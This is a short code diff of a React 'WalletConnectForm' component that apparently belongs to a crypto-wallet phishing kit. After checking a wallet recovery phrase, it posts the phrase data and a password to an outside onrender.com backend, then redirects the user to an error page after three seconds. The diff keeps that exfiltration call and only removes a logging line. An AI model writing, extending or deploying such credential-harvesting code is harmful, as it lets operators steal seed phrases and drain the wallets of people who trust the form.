@@ -52,8 +52,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     
     if (validatePhrase(phrase)) {
       try {
-        const res = await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
-        console.log(res);
+         await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
         setTimeout(() => {
           navigate('/error')
         }, 3000);
